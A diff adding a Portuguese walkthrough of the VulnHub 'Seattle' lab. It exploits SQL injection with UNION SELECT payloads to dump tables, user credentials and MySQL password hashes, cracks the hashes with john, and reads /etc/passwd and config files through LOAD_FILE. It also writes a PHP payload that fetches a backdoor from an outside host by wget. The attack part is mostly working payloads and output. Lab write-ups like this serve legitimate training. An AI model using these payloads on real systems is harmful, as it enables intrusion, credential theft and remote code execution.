@@ -116,3 +116,160 @@ O que acontece quando eu utilizo o union select é que eu devo ter de um lado da
 ![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/sqli1.png)
 
 Ai está, conseguimos manipular os itens 3 e 5
+
+## Explorando
+
+Agora vamos iniciar a exfiltração de informações desese banco de dados
+
+Bom, agora que sabemos que temos um ponto que pode ser explorado vamos partir para outra parte, a explicação de como funciona a tabela SCHEMA
+
+A tabela SCHEMA do banco de dados é interessante nós realizarmos o dump nela, uma vez que ela contém uma "prévia" de todas as outras tabelas
+
+[Schema](https://dev.mysql.com/doc/refman/8.0/en/information-schema.html)
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_b4.png)
+
+Com a dica do site pentestmonkney.net eu começo a extração
+
+[Monkey](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
+
+SELECT SCHEMA_NAME from INFORMATION_SCHEMA.SCHEMATA LIMIT 1
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_b5.png)
+
+Ai está
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/sqli2.png)
+
+Para uma vizualização melhor, devemos utilizar o group_concat, que vai concatenar mais de um resultado
+
+SELECT group_concat(SCHEMA_NAME,":") from INFORMATION_SCHEMA.SCHEMATA LIMIT 1
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/sqli3.png)
+
+Opa, essa database `seattle` é interessante
+
+Agora verifico quais campos (tables e colunas) se encontram nessa database seattle que nos pareceu a mais promissora
+
+(SELECT+group_concat(TABLE_NAME,":",COLUMN_NAME,"\r\n")+from+Information_Schema.COLUMNS+where+TABLE_SCHEMA+=+'seattle'),4,5
+
+ou aqui vamos extrair apenas as tabelas que temos na databse seattle 
+
+UNION SELECT 1,2,GROUP_CONCAT(TABLE_NAME),4,5 from INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = "seattle"-- -
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/aa.png)
+
+tblMembers,tblProducts,tblBlogs
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/sqli4.png)
+
+Ai estão todas as tables dessa database
+
+Agora vamos extrair as colunas (COLUMN_NAME) das tables
+
+tblBlogs:author,tblBlogs:title,tblBlogs:content,tblMembers:id,tblMembers:username,tblMembers:password,tblMembers:session,tblMembers:name,tblMembers:blog,tblMembers:admin,tblProducts:id,tblProducts:type,tblProducts:name,tblProducts:price,tblProducts:detail
+
+UNION SELECT 1,2,GROUP_CONCAT(TABLE_NAME,":",COLUMN_NAME),4,5 from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = "seattle"-- -
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/aa1.png)
+
+Certo, agora vamos extrair aquelas informações da database seattle com a table tblMembers e as colunas username e password
+
+UNION SELECT 1,2,GROUP_CONCAT(username,":",password),4,5 from tblMembers-- -
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/aa2.png)
+
+`admin@seattlesounds.net:Assasin1`
+
+Pronto, temos a senha dele!
+
+## Extraindo a senha do Banco de Dados
+
+No pentestmonkey.net tem como faço pra listar esses usuários
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_b10.png)
+
+Então, faço a extração
+
+(SELECT+group_concat(host,+user,+password)+FROM+mysql.user)
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/sqli5.png)
+
+`localhostroot*56C28F8C2F6D2BD560D6D2F04565A902BEAA3738,127.0.0.1root*845A9ADD7E1A82B6459804066B3A45D0025897B6,::1root*845A9ADD7E1A82B6459804066B3A45D0025897B6`
+
+Ai está, agora vejo como faço pra tentar quebrar essa senha
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_j.png)
+
+Realizo a quebra da senha
+
+`john --format=mysql-sha1 mysql.hash`
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/john.png)
+
+Pronto, conseguimos quebrar um dos hashs, e a senha é PASSWORD
+
+### Outro modo de se descobrir a senha
+
+Bom, também há outro modo de se descobrirmos essa senha, através de um LFI pelo SQLInjection
+
+A ideia aqui é explorar esse SQLi para termos um LFI, e com esse LFI ler o arquivo de configuração do banco de dados, onde está a credencial de acesso
+
+UNION+SELECT+1,2,(LOAD_FILE("/etc/passwd")),4,5
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/sqli6.png)
+
+(LOAD_FILE("/var/www/html/details.php"))
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/sqli7.png)
+
+(LOAD_FILE("/var/www/html/prod-details.php"))
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/sqli8.png)
+
+(LOAD_FILE("/var/www/html/connection.php"))
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/sqli9.png)
+
+(LOAD_FILE("/var/www/html/config.php"))
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/sqli10.png)
+
+Pronto, descobrimos outra senha
+
+```
+$user = 'root';
+$pass = 'Alexis*94';
+```
+
+### Upload de Arquivos
+
+Sim, também podemos fazer upload de arquivos, e seguindo essa ideia fazer upload de um shell php
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/back.png)
+
+(SELECT '<?php exec("wget -O /var/www/html/sqli.php http://192.168.56.102/simple-backdoor.php"); ?>'),4,5 INTO OUTFILE '/var/www/html/rev.php'
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/sqli11.png)
+
+Permissão negada, beleza, o que vale é a ideia, muitas vezes o administrador da página web deixa a permissão de escrita pro usuário nessa pasta, ai conseguimos fazer o upload de arquivos lá
+
+Caso desse certo, deveriamos acessar o `rev.php` pra ele fazer o download do simples-backdoor.php e depois acessar o `sqli.php` pra conseguirmos executar comandos na máquina.
+
+### SQLMap
+
+Também podemos usar o sqlmap pra descobrir a senha, apesar de eu não gostar dessa ferramenta, é importante mostrarmos a utilidade dela
+
+Salvamos para um arquivo a requisição
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/req.png)
+
+E fazemos o dump
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/req1.png)
+
+Aqui está a senha
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-seattle/req2.png)
+
+Simples assim.
